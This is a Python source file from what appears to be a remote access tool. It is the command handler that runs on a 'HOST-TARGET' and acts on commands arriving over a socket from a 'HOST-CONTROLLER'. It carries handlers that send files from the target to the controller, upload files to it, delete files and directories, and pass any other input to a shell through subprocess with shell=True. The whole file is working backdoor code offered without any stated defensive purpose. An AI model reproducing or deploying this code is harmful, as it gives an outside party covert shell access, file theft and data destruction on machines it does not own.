# Command Handler

import os
import subprocess
import shutil
import socket 
from utils import (
    send_file,
    recieve_file,
    remove_file
)


CMDS: list[str] = [
    "pwd",
    "cd ",
    "mkdir ",
    "rmdir ",
    "getfile ",
    "upfile ",
    "rmfile ", 
]

OK      = 1
EXIT    = 0

def handle_command(cmd: bytes, conn: socket.socket) -> list[str, int]:
    cmd = cmd.decode().strip()
    try:
        if cmd.startswith("exit"):
            return [f"[-] Disconnected from HOST-CONTROLLER", EXIT]
        
        elif cmd.startswith(CMDS[0]):
            return [os.getcwd(), OK]
        
        elif cmd.startswith(CMDS[1]):
            path = cmd[len(CMDS[1]):].strip()
            os.chdir(path)
            return [f"Changed dir to {os.getcwd()}", OK]
        
        elif cmd.startswith(CMDS[2]):
            cmd = cmd[len(CMDS[2]):].strip()
            os.mkdir(cmd)
            return [f"Created directory: {cmd}", OK]
        
        elif cmd.startswith(CMDS[3]):
            cmd = cmd[len(CMDS[3]):].strip()
            try:
                shutil.rmtree(cmd)
                return [f"Removed directory: {cmd}", OK]
            except Exception as e:
                return [f"[ERR]: {e}", OK]
        
        # SEND FILE TO HOST-CONTROLLER
        elif cmd.startswith(CMDS[4]):
            path = cmd[len(CMDS[4]):].strip()
            return [send_file(path, conn), OK]
        
        # RECIEVE FILE FROM HOST-CONTROLLER
        elif cmd.startswith(CMDS[5]):
            path = cmd[len(CMDS[5]):].strip()
            return [recieve_file(path, conn), OK]
        
        # DELETE FILE IN HOST-TARGET
        elif cmd.startswith(CMDS[6]):
            path = cmd[len(CMDS[6]):].strip()
            return [remove_file(path), OK]
        
        # ADD COMMAND HERE >>>
        
        ######################
        
        else:
            return [execute_shell(cmd), OK]
        
    except Exception as e:
        return [f"[ERRSER_Handler]: {e}", OK]
    

def execute_shell(cmd: bytes):
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
    )
    
    output = process.stdout.read() + process.stderr.read()
    return output.decode()